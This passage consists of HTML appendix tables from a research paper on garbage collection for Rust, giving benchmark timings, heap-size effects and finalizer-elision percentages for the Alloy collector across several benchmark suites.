<td>1.26 <span>±0.02</span></td>
<td>1.26 <span>±0.00</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>0.60 <span>±0.00</span></td>
<td>0.91 <span>±0.00</span></td>
<td>0.79 <span>±0.00</span></td>
</tr>
<tr>
<td>Richards</td>
<td>2.47 <span>±0.02</span></td>
<td>3.72 <span>±0.11</span></td>
<td>3.13 <span>±0.01</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>0.66 <span>±0.00</span></td>
<td>0.94 <span>±0.01</span></td>
<td>0.87 <span>±0.00</span></td>
</tr>
<tr>
<td>Storage</td>
<td>0.55 <span>±0.00</span></td>
<td>0.69 <span>±0.01</span></td>
<td>0.68 <span>±0.00</span></td>
</tr>
<tr>
<td>Sum</td>
<td>0.52 <span>±0.00</span></td>
<td>0.82 <span>±0.01</span></td>
<td>0.67 <span>±0.00</span></td>
</tr>
<tr>
<td>Towers</td>
<td>0.31 <span>±0.00</span></td>
<td>0.46 <span>±0.01</span></td>
<td>0.38 <span>±0.00</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>0.31 <span>±0.00</span></td>
<td>0.40 <span>±0.01</span></td>
<td>0.40 <span>±0.00</span></td>
</tr>
<tr>
<td>WhileLoop</td>
<td>0.47 <span>±0.00</span></td>
<td>0.72 <span>±0.00</span></td>
<td>0.59 <span>±0.00</span></td>
</tr>
<tr data-suite="grmtools">
<td colspan="4"><span>grmtools</span> <span>▶</span></td>
</tr>
<tr>
<td>Eclipse</td>
<td>3.32 <span>±0.03</span></td>
<td>3.28 <span>±0.03</span></td>
<td>3.59 <span>±0.04</span></td>
</tr>
<tr>
<td>Hadoop</td>
<td>2.77 <span>±0.01</span></td>
<td>2.80 <span>±0.01</span></td>
<td>2.99 <span>±0.01</span></td>
</tr>
<tr>
<td>Jenkins</td>
<td>2.74 <span>±0.01</span></td>
<td>2.81 <span>±0.04</span></td>
<td>2.90 <span>±0.01</span></td>
</tr>
<tr>
<td>Spring</td>
<td>2.35 <span>±0.01</span></td>
<td>2.40 <span>±0.01</span></td>
<td>2.54 <span>±0.02</span></td>
</tr>

<tr data-suite="ripgrep">
<td colspan="4"><span>Ripgrep</span> <span>▶</span></td>
</tr>
<tr>
<td>Alternates</td>
<td>0.42 <span>±0.02</span></td>
<td>0.51 <span>±0.02</span></td>
<td>0.43 <span>±0.02</span></td>
</tr>
<tr>
<td>Alternates (-i)</td>
<td>0.54 <span>±0.02</span></td>
<td>0.65 <span>±0.02</span></td>
<td>0.57 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal</td>
<td>0.34 <span>±0.02</span></td>
<td>0.44 <span>±0.01</span></td>
<td>0.36 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (-i)</td>
<td>0.41 <span>±0.02</span></td>
<td>0.50 <span>±0.02</span></td>
<td>0.44 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal (default)</td>
<td>0.30 <span>±0.02</span></td>
<td>0.40 <span>±0.01</span></td>
<td>0.32 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (mmap)</td>
<td>0.43 <span>±0.02</span></td>
<td>0.52 <span>±0.02</span></td>
<td>0.46 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal (mmap, -i)</td>
<td>0.48 <span>±0.02</span></td>
<td>0.58 <span>±0.02</span></td>
<td>0.50 <span>±0.02</span></td>
</tr>
<tr>
<td>Literal (regex)</td>
<td>0.35 <span>±0.02</span></td>
<td>0.44 <span>±0.02</span></td>
<td>0.36 <span>±0.01</span></td>
</tr>
<tr>
<td>UTF Greek</td>
<td>2.55 <span>±0.02</span></td>
<td>2.64 <span>±0.02</span></td>
<td>2.58 <span>±0.03</span></td>
</tr>
<tr>
<td>UTF Greek (-i)</td>
<td>2.56 <span>±0.03</span></td>
<td>2.66 <span>±0.03</span></td>
<td>2.56 <span>±0.02</span></td>
</tr>
<tr>
<td>UTF Word</td>
<td>0.35 <span>±0.02</span></td>
<td>0.42 <span>±0.02</span></td>
<td>0.37 <span>±0.02</span></td>
</tr>
<tr>
<td>UTF Word (alt.)</td>
<td>0.33 <span>±0.02</span></td>
<td>0.43 <span>±0.02</span></td>
<td>0.35 <span>±0.01</span></td>
</tr>
<tr>
<td>Word</td>
<td>0.35 <span>±0.02</span></td>
<td>0.43 <span>±0.02</span></td>
<td>0.36 <span>±0.01</span></td>
</tr>

<tr data-suite="som-rs-bc">
<td colspan="4"><span>som-rs-bc</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>0.25 <span>±0.00</span></td>
<td>0.28 <span>±0.00</span></td>
<td>0.29 <span>±0.00</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>0.22 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>0.30 <span>±0.00</span></td>
<td>0.34 <span>±0.00</span></td>
<td>0.35 <span>±0.01</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>0.24 <span>±0.00</span></td>
<td>0.28 <span>±0.00</span></td>
<td>0.29 <span>±0.00</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>0.24 <span>±0.00</span></td>
<td>0.28 <span>±0.00</span></td>
<td>0.28 <span>±0.00</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>0.30 <span>±0.00</span></td>
<td>0.36 <span>±0.00</span></td>
<td>0.36 <span>±0.00</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>0.48 <span>±0.00</span></td>
<td>0.42 <span>±0.01</span></td>
<td>0.53 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>0.12 <span>±0.00</span></td>
<td>0.11 <span>±0.00</span></td>
<td>0.14 <span>±0.00</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>0.22 <span>±0.00</span></td>
<td>0.24 <span>±0.00</span></td>
<td>0.26 <span>±0.00</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>0.36 <span>±0.00</span></td>
<td>0.39 <span>±0.01</span></td>
<td>0.44 <span>±0.00</span></td>
</tr>
<tr>
<td>List</td>
<td>0.17 <span>±0.00</span></td>
<td>0.22 <span>±0.00</span></td>
<td>0.21 <span>±0.01</span></td>
</tr>
<tr>
<td>Loop</td>
<td>0.22 <span>±0.00</span></td>
<td>0.25 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>0.19 <span>±0.00</span></td>
<td>0.21 <span>±0.01</span></td>
<td>0.23 <span>±0.00</span></td>
</tr>
<tr>
<td>NBody</td>
<td>0.11 <span>±0.00</span></td>
<td>0.12 <span>±0.00</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>0.12 <span>±0.00</span></td>
<td>0.12 <span>±0.00</span></td>
<td>0.14 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
<td>0.23 <span>±0.00</span></td>
<td>0.26 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>Queens</td>
<td>0.27 <span>±0.01</span></td>
<td>0.33 <span>±0.00</span></td>
<td>0.33 <span>±0.00</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>0.35 <span>±0.00</span></td>
<td>0.38 <span>±0.00</span></td>
<td>0.42 <span>±0.00</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>0.25 <span>±0.00</span></td>
<td>0.31 <span>±0.00</span></td>
<td>0.30 <span>±0.01</span></td>
</tr>
<tr>
<td>Richards</td>
<td>0.92 <span>±0.00</span></td>
<td>1.20 <span>±0.01</span></td>
<td>1.10 <span>±0.01</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>0.25 <span>±0.00</span></td>
<td>0.26 <span>±0.00</span></td>
<td>0.30 <span>±0.01</span></td>
</tr>
<tr>
<td>Storage</td>
<td>0.22 <span>±0.00</span></td>
<td>0.20 <span>±0.00</span></td>
<td>0.25 <span>±0.00</span></td>
</tr>
<tr>
<td>Sum</td>
<td>0.22 <span>±0.00</span></td>
<td>0.24 <span>±0.00</span></td>
<td>0.26 <span>±0.00</span></td>
</tr>
<tr>
<td>Towers</td>
<td>0.12 <span>±0.00</span></td>
<td>0.15 <span>±0.00</span></td>
<td>0.14 <span>±0.00</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>0.11 <span>±0.00</span></td>
<td>0.11 <span>±0.00</span></td>
<td>0.12 <span>±0.00</span></td>
</tr>
<tr>
<td>WhileLoop</td>
<td>0.21 <span>±0.00</span></td>
<td>0.22 <span>±0.00</span></td>
<td>0.25 <span>±0.00</span></td>
</tr>
</tbody>
</table>
<figcaption><span>Table 8.  </span><span>User times (in seconds) for each benchmark in the <span>E<sub>GCvs</sub></span> experiment. Values show arithmetic means over 30 runs and include 99% confidence intervals.</span></figcaption>
</figure>

<figure>
<a id="x1-30034r9"></a>
<table>
<thead>
<tr>
<th></th>
<th>Heap Size (MiB)</th>
<th>Relative wall-clock time</th>
<th>Benchmarks failed</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="3"><span>Alacritty</span></td>
<td>16</td>
<td>0.96 <span>[0.91, 0.99]</span></td>
<td></td>
</tr>
<tr>
<td>32</td>
<td>0.98 <span>[0.95, 1.02]</span></td>
<td></td>
</tr>
<tr>
<td>64</td>
<td>0.94 <span>[0.89, 0.98]</span></td>
<td></td>
</tr>

<tr>
<td rowspan="3"><span>Binary Trees</span></td>
<td>4</td>
<td>0.88 <span>[0.82, 1.02]</span></td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>0.90 <span>[0.80, 1.01]</span></td>
<td></td>
</tr>
<tr>
<td>16</td>
<td>0.87 <span>[0.82, 0.94]</span></td>
<td></td>
</tr>

<tr>
<td rowspan="3"><span>fd</span></td>
<td>16</td>
<td>0.94 <span>[0.90, 0.99]</span></td>
<td></td>
</tr>
<tr>
<td>32</td>
<td>0.94 <span>[0.88, 0.98]</span></td>
<td></td>
</tr>
<tr>
<td>64</td>
<td>0.94 <span>[0.89, 1.00]</span></td>
<td></td>
</tr>

<tr>
<td rowspan="3"><span>grmtools</span></td>
<td>1024</td>
<td>1.01 <span>[1.00, 1.02]</span></td>
<td>2/4 (Eclipse, Jenkins)</td>
</tr>
<tr>
<td>2048</td>
<td>1.00 <span>[1.00, 1.01]</span></td>
<td></td>
</tr>
<tr>
<td>4096</td>
<td>1.01 <span>[1.00, 1.02]</span></td>
<td></td>
</tr>

<tr>
<td rowspan="3"><span>Regex-Redux</span></td>
<td>256</td>
<td>0.94 <span>[0.92, 0.95]</span></td>
<td></td>
</tr>
<tr>
<td>512</td>
<td>0.93 <span>[0.90, 0.94]</span></td>
<td></td>
</tr>
<tr>
<td>1024</td>
<td>0.96 <span>[0.92, 1.07]</span></td>
<td></td>
</tr>

<tr>
<td rowspan="3"><span>Ripgrep</span></td>
<td>32</td>
<td>0.96 <span>[0.95, 0.96]</span></td>
<td></td>
</tr>
<tr>
<td>64</td>
<td>0.95 <span>[0.94, 0.95]</span></td>
<td></td>
</tr>
<tr>
<td>128</td>
<td>0.94 <span>[0.93, 0.95]</span></td>
<td></td>
</tr>

<tr>
<td rowspan="3"><span>som-rs-ast</span></td>
<td>64</td>
<td>0.72 <span>[0.71, 0.74]</span></td>
<td>2/4 (Fannkuch, TreeSort)</td>
</tr>
<tr>
<td>96</td>
<td>0.74 <span>[0.73, 0.75]</span></td>
<td>2/4 (Fannkuch, TreeSort)</td>
</tr>
<tr>
<td>128</td>
<td>0.75 <span>[0.74, 0.76]</span></td>
<td></td>
</tr>

<tr>
<td rowspan="3"><span>som-rs-bc</span></td>
<td>32</td>
<td>0.79 <span>[0.78, 0.80]</span></td>
<td></td>
</tr>
<tr>
<td>64</td>
<td>0.79 <span>[0.77, 0.80]</span></td>
<td></td>
</tr>
<tr>
<td>128</td>
<td>0.84 <span>[0.83, 0.86]</span></td>
<td></td>
</tr>
</tbody>
</table>
<figcaption><span>Table 9.  </span><span>The effects of fixing the heap size (see Section 8.1.3) on wall-clock time, reported as ratios relative to <span>BDWGC</span>'s default adaptive RSS strategy. We chose per-benchmark heap sizes based on our observations of their memory usage, though some benchmarks fail at smaller values. Broadly speaking, these results show that the performance differences due to different heap sizes are relatively minor, and that <span>BDWGC</span>'s adaptive strategy has not unduly coloured our results.</span></figcaption>
</figure>


<figure>
<a id="x1-30035r10"></a>
<table>
<thead>
<tr>
<th></th>
<th>Fin. elided (%)</th>
</tr>
</thead>
<tbody>
<tr data-suite="alacritty">
<td colspan="2"><span>Alacritty</span> <span>▶</span></td>
</tr>
<tr>
<td>Cur. Motion</td>
<td>0.00</td>
</tr>
<tr>
<td>Dense Cells</td>
<td>0.00</td>
</tr>
<tr>
<td>Light Cells</td>
<td>0.00</td>
</tr>
<tr>
<td>Scroll</td>
<td>0.00</td>
</tr>
<tr>
<td>Scroll Btm</td>
<td>0.00</td>
</tr>
<tr>
<td>Scroll Btm (small)</td>
<td>0.00</td>
</tr>
<tr>
<td>Scroll (fullscreen)</td>
<td>0.00</td>
</tr>
<tr>
<td>Scroll Top</td>
<td>0.00</td>
</tr>
<tr>
<td>Scroll Top (small)</td>
<td>0.00</td>
</tr>
<tr>
<td>Unicode</td>
<td>0.00</td>
</tr>

<tr data-suite="fd">
<td colspan="2"><span>fd</span> <span>▶</span></td>
</tr>
<tr>
<td>Cmd Exec.</td>
<td>8.93</td>
</tr>
<tr>
<td>Cmd Exec. (large)</td>
<td>9.09</td>
</tr>
<tr>
<td>File Extension</td>
<td>72.73</td>
</tr>
<tr>
<td>File Type</td>
<td>24.54</td>
</tr>
<tr>
<td>No Pattern</td>
<td>0.04</td>
</tr>
<tr>
<td>Simple</td>
<td>61.54</td>
</tr>
<tr>
<td>Simple (-HI)</td>
<td>61.54</td>
</tr>

<tr data-suite="som-rs-ast">
<td colspan="2"><span>som-rs-ast</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>100.00</td>
</tr>
<tr>
<td>BubbleSort</td>
<td>100.00</td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>100.00</td>
</tr>
<tr>
<td>Dispatch</td>
<td>100.00</td>
</tr>
<tr>
<td>Fannkuch</td>
<td>100.00</td>
</tr>
<tr>
<td>Fibonacci</td>
<td>100.00</td>
</tr>
<tr>
<td>FieldLoop</td>
<td>100.00</td>
</tr>
<tr>
<td>GraphSearch</td>
<td>99.99</td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>100.00</td>
</tr>
<tr>
<td>JsonSmall</td>
<td>100.00</td>
</tr>
<tr>
<td>List</td>
<td>100.00</td>
</tr>
<tr>
<td>Loop</td>
<td>100.00</td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>100.00</td>
</tr>
<tr>
<td>NBody</td>
<td>99.99</td>
</tr>
<tr>
<td>PageRank</td>
<td>99.99</td>
</tr>
<tr>
<td>Permute</td>
<td>100.00</td>
</tr>
<tr>
<td>Queens</td>
<td>100.00</td>
</tr>
<tr>
<td>QuickSort</td>
<td>100.00</td>
</tr>
<tr>
<td>Recurse</td>
<td>100.00</td>
</tr>
<tr>
<td>Richards</td>
<td>100.00</td>
</tr>
<tr>
<td>Sieve</td>
<td>100.00</td>
</tr>
<tr>
<td>Storage</td>
<td>100.00</td>
</tr>
<tr>
<td>Sum</td>
<td>100.00</td>
</tr>
<tr>
<td>Towers</td>
<td>99.99</td>
</tr>
<tr>
<td>TreeSort</td>
<td>99.99</td>
</tr>
<tr>
<td>WhileLoop</td>
<td>100.00</td>
</tr>
<tr data-suite="grmtools">
<td colspan="2"><span>grmtools</span> <span>▶</span></td>
</tr>
<tr>
<td>Eclipse</td>
<td>11.79</td>
</tr>
<tr>
<td>Hadoop</td>
<td>32.99</td>
</tr>
<tr>
<td>Jenkins</td>
<td>26.74</td>
</tr>
<tr>
<td>Spring</td>
<td>37.25</td>
</tr>

<tr data-suite="ripgrep">
<td colspan="2"><span>Ripgrep</span> <span>▶</span></td>
</tr>
<tr>
<td>Alternates</td>
<td>79.04</td>
</tr>
<tr>
<td>Alternates (-i)</td>
<td>79.04</td>
</tr>
<tr>
<td>Literal</td>
<td>79.04</td>
</tr>
<tr>
<td>Literal (-i)</td>
<td>79.04</td>
</tr>
<tr>
<td>Literal (mmap, -i)</td>
<td>79.04</td>
</tr>
<tr>
<td>Literal (default)</td>
<td>79.04</td>
</tr>
<tr>
<td>Literal (mmap)</td>
<td>79.04</td>
</tr>
<tr>
<td>Literal (regex)</td>
<td>79.04</td>
</tr>
<tr>
<td>UTF Greek</td>
<td>79.04</td>
</tr>
<tr>
<td>UTF Greek (-i)</td>
<td>79.04</td>
</tr>
<tr>
<td>UTF Word</td>
<td>79.04</td>
</tr>
<tr>
<td>UTF Word (alt.)</td>
<td>79.04</td>
</tr>
<tr>
<td>Word</td>
<td>79.04</td>
</tr>

<tr data-suite="som-rs-bc">
<td colspan="2"><span>som-rs-bc</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>72.50</td>
</tr>
<tr>
<td>BubbleSort</td>
<td>76.34</td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>73.86</td>
</tr>
<tr>
<td>Dispatch</td>
<td>77.78</td>
</tr>
<tr>
<td>Fannkuch</td>
<td>72.74</td>
</tr>
<tr>
<td>Fibonacci</td>
<td>70.37</td>
</tr>
<tr>
<td>FieldLoop</td>
<td>83.33</td>
</tr>
<tr>
<td>GraphSearch</td>
<td>76.56</td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>75.00</td>
</tr>
<tr>
<td>JsonSmall</td>
<td>71.85</td>
</tr>
<tr>
<td>List</td>
<td>79.41</td>
</tr>
<tr>
<td>Loop</td>
<td>74.82</td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>70.93</td>
</tr>
<tr>
<td>NBody</td>
<td>86.17</td>
</tr>
<tr>
<td>PageRank</td>
<td>70.95</td>
</tr>
<tr>
<td>Permute</td>
<td>79.23</td>
</tr>
<tr>
<td>Queens</td>
<td>79.04</td>
</tr>
<tr>
<td>QuickSort</td>
<td>69.33</td>
</tr>
<tr>
<td>Recurse</td>
<td>82.61</td>
</tr>
<tr>
<td>Richards</td>
<td>71.17</td>
</tr>
<tr>
<td>Sieve</td>
<td>73.15</td>
</tr>
<tr>
<td>Storage</td>
<td>73.84</td>
</tr>
<tr>
<td>Sum</td>
<td>75.00</td>
</tr>
<tr>
<td>Towers</td>
<td>78.29</td>
</tr>
<tr>
<td>TreeSort</td>
<td>65.19</td>
</tr>
<tr>
<td>WhileLoop</td>
<td>74.98</td>
</tr>
</tbody>
</table>
        <figcaption><p><span>Table 10.  </span><span>Percentage of finalizers <span>Alloy</span> was able to elide for each benchmark.</span></p></figcaption>
</figure>

<figure>
<a id="x1-30036r5"></a>
<p><img src="https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/images/appendix_elision_wallclock.svg" alt="Wall-clock time performance comparison" width="100%">
</p>
<p><img src="https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/images/appendix_elision_user.svg" alt="User time performance comparison" width="100%">
</p>
<figcaption>
<span>Figure 5.  </span>
<span>Wall-clock and user time performance comparison for finalizer elision on each benchmark. The bars show the relative performance of <span>Alloy</span> after applying our elision optimization, normalized against the baseline (solid black line). The vertical blue line marks the overall geometric mean (with shaded area for CIs). User time often shows greater improvement than wall-clock time, as elision reduces the CPU overhead of the finalization thread.</span>
</figcaption>
</figure>


<figure>
<a id="x1-30037r11"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="2">Wall-clock time (s)</th>
</tr>
<tr>
<th></th>
<th>Before elision</th>
<th>After elision</th>
</tr>
</thead>
<tbody>
<tr data-suite="alacritty">
<td colspan="3"><span>Alacritty</span> <span>▶</span></td>
</tr>
<tr>
<td>Cur. Motion</td>
<td>0.66 <span>±0.01</span></td>
<td>0.66 <span>±0.01</span></td>
</tr>
<tr>
<td>Dense Cells</td>
<td>2.17 <span>±0.03</span></td>
<td>2.17 <span>±0.02</span></td>
</tr>
<tr>
<td>Light Cells</td>
<td>0.39 <span>±0.01</span></td>
<td>0.38 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll</td>
<td>0.27 <span>±0.01</span></td>
<td>0.27 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll (fullscreen)</td>
<td>0.39 <span>±0.01</span></td>
<td>0.39 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Btm</td>
<td>0.33 <span>±0.00</span></td>
<td>0.33 <span>±0.00</span></td>
</tr>
<tr>
<td>Scroll Btm (small)</td>
<td>0.33 <span>±0.00</span></td>
<td>0.33 <span>±0.00</span></td>
</tr>
<tr>
<td>Scroll Top</td>
<td>0.25 <span>±0.01</span></td>
<td>0.24 <span>±0.04</span></td>
</tr>
<tr>
<td>Scroll Top (small)</td>
<td>0.33 <span>±0.00</span></td>
<td>0.33 <span>±0.01</span></td>
</tr>
<tr>
<td>Unicode</td>
<td>0.26 <span>±0.02</span></td>
<td>0.26 <span>±0.02</span></td>
</tr>

<tr data-suite="fd">
<td colspan="3"><span>fd</span> <span>▶</span></td>
</tr>
<tr>
<td>Cmd Exec.</td>
<td>1.29 <span>±0.02</span></td>
<td>1.29 <span>±0.02</span></td>
</tr>
<tr>
<td>Cmd Exec. (large)</td>
<td>1.25 <span>±0.01</span></td>
<td>1.25 <span>±0.02</span></td>
</tr>
<tr>
<td>File Extension</td>
<td>0.15 <span>±0.00</span></td>
<td>0.14 <span>±0.01</span></td>
</tr>
<tr>
<td>File Type</td>
<td>0.13 <span>±0.01</span></td>
<td>0.13 <span>±0.01</span></td>
</tr>
<tr>
<td>No Pattern</td>
<td>0.28 <span>±0.02</span></td>
<td>0.29 <span>±0.02</span></td>
</tr>
<tr>
<td>Simple</td>
<td>0.34 <span>±0.01</span></td>
<td>0.35 <span>±0.00</span></td>
</tr>
<tr>
<td>Simple (-HI)</td>
<td>0.14 <span>±0.01</span></td>
<td>0.14 <span>±0.01</span></td>
</tr>

<tr data-suite="som-rs-ast">
<td colspan="3"><span>som-rs-ast</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>7.68 <span>±0.40</span></td>
<td>1.03 <span>±0.01</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>5.27 <span>±0.29</span></td>
<td>0.92 <span>±0.01</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>7.84 <span>±0.19</span></td>
<td>1.17 <span>±0.01</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>6.52 <span>±0.46</span></td>
<td>1.04 <span>±0.01</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>6.76 <span>±0.09</span></td>
<td>1.15 <span>±0.03</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>22.16 <span>±1.87</span></td>
<td>1.54 <span>±0.01</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>5.14 <span>±0.16</span></td>
<td>1.25 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>2.82 <span>±0.06</span></td>
<td>0.47 <span>±0.00</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>5.88 <span>±0.11</span></td>
<td>0.90 <span>±0.01</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>11.37 <span>±0.77</span></td>
<td>1.33 <span>±0.01</span></td>
</tr>
<tr>
<td>List</td>
<td>4.06 <span>±0.06</span></td>
<td>0.58 <span>±0.00</span></td>
</tr>
<tr>
<td>Loop</td>
<td>6.02 <span>±0.14</span></td>
<td>0.90 <span>±0.01</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>4.67 <span>±0.11</span></td>
<td>0.74 <span>±0.01</span></td>
</tr>
<tr>
<td>NBody</td>
<td>2.91 <span>±0.16</span></td>
<td>0.40 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>2.44 <span>±0.05</span></td>
<td>0.47 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
<td>6.69 <span>±0.35</span></td>
<td>0.97 <span>±0.02</span></td>
</tr>
<tr>
<td>Queens</td>
<td>9.07 <span>±0.34</span></td>
<td>1.28 <span>±0.02</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>10.86 <span>±0.66</span></td>
<td>1.39 <span>±0.02</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>7.66 <span>±0.24</span></td>
<td>0.98 <span>±0.00</span></td>
</tr>
<tr>
<td>Richards</td>
<td>97.40 <span>±10.46</span></td>
<td>3.95 <span>±0.08</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>7.06 <span>±0.13</span></td>
<td>1.01 <span>±0.01</span></td>
</tr>
<tr>
<td>Storage</td>
<td>5.06 <span>±0.10</span></td>
<td>0.75 <span>±0.01</span></td>
</tr>
<tr>
<td>Sum</td>
<td>5.91 <span>±0.12</span></td>
<td>0.89 <span>±0.01</span></td>
</tr>
<tr>
<td>Towers</td>
<td>3.20 <span>±0.14</span></td>
<td>0.50 <span>±0.01</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>4.65 <span>±0.32</span></td>
<td>0.45 <span>±0.00</span></td>
</tr>
<tr>
<td>WhileLoop</td>
<td>5.03 <span>±0.21</span></td>
<td>0.76 <span>±0.01</span></td>
</tr>
<tr data-suite="grmtools">
<td colspan="3"><span>grmtools</span> <span>▶</span></td>
</tr>
<tr>
<td>Eclipse</td>
<td>5.09 <span>±0.05</span></td>
<td>3.59 <span>±0.06</span></td>
</tr>
<tr>
<td>Hadoop</td>
<td>4.49 <span>±0.03</span></td>
<td>3.07 <span>±0.05</span></td>
</tr>
<tr>
<td>Jenkins</td>
<td>4.45 <span>±0.02</span></td>
<td>3.02 <span>±0.01</span></td>
</tr>
<tr>
<td>Spring</td>
<td>4.11 <span>±0.03</span></td>
<td>2.65 <span>±0.01</span></td>
</tr>

<tr data-suite="ripgrep">
<td colspan="3"><span>Ripgrep</span> <span>▶</span></td>
</tr>
<tr>
<td>Alternates</td>
<td>1.44 <span>±0.03</span></td>
<td>1.39 <span>±0.01</span></td>
</tr>
<tr>
<td>Alternates (-i)</td>
<td>1.55 <span>±0.02</span></td>
<td>1.50 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal</td>
<td>1.38 <span>±0.03</span></td>
<td>1.32 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (-i)</td>
<td>1.45 <span>±0.02</span></td>
<td>1.38 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (default)</td>
<td>1.38 <span>±0.02</span></td>
<td>1.30 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (mmap)</td>
<td>1.90 <span>±0.02</span></td>
<td>1.81 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (mmap, -i)</td>
<td>1.90 <span>±0.03</span></td>
<td>1.84 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (regex)</td>
<td>1.36 <span>±0.03</span></td>
<td>1.33 <span>±0.01</span></td>
</tr>
<tr>
<td>UTF Greek</td>
<td>3.53 <span>±0.01</span></td>
<td>3.50 <span>±0.02</span></td>
</tr>
<tr>
<td>UTF Greek (-i)</td>
<td>3.51 <span>±0.02</span></td>
<td>3.52 <span>±0.02</span></td>
</tr>
<tr>
<td>UTF Word</td>
<td>1.39 <span>±0.02</span></td>
<td>1.30 <span>±0.01</span></td>
</tr>
<tr>
<td>UTF Word (alt.)</td>
<td>1.36 <span>±0.02</span></td>
<td>1.31 <span>±0.02</span></td>
</tr>
<tr>
<td>Word</td>
<td>1.36 <span>±0.02</span></td>
<td>1.31 <span>±0.01</span></td>
</tr>

<tr data-suite="som-rs-bc">
<td colspan="3"><span>som-rs-bc</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>3.03 <span>±0.04</span></td>
<td>0.31 <span>±0.00</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>2.64 <span>±0.04</span></td>
<td>0.29 <span>±0.00</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>4.19 <span>±0.08</span></td>
<td>0.37 <span>±0.00</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>3.80 <span>±0.36</span></td>
<td>0.30 <span>±0.00</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>2.86 <span>±0.23</span></td>
<td>0.31 <span>±0.00</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>4.34 <span>±0.20</span></td>
<td>0.40 <span>±0.00</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>2.45 <span>±0.16</span></td>
<td>0.45 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>1.15 <span>±0.03</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>3.00 <span>±0.16</span></td>
<td>0.26 <span>±0.00</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>4.96 <span>±0.80</span></td>
<td>0.42 <span>±0.01</span></td>
</tr>
<tr>
<td>List</td>
<td>2.69 <span>±0.09</span></td>
<td>0.24 <span>±0.01</span></td>
</tr>
<tr>
<td>Loop</td>
<td>3.07 <span>±0.18</span></td>
<td>0.28 <span>±0.00</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>2.21 <span>±0.15</span></td>
<td>0.23 <span>±0.00</span></td>
</tr>
<tr>
<td>NBody</td>
<td>1.23 <span>±0.06</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>1.06 <span>±0.01</span></td>
<td>0.14 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
